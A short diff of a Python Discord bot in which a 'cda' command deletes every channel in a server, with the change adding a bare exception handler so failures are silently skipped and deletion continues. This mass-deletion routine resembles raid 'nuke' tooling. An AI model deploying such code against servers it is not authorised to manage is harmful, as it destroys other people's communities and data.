@@ -64,6 +64,7 @@ async def cda(ctx):
     for channel in list(ctx.message.guild.channels):
         try:
             await channel.delete()
-            
+        except:
+            pass   
 
 client.run(token)
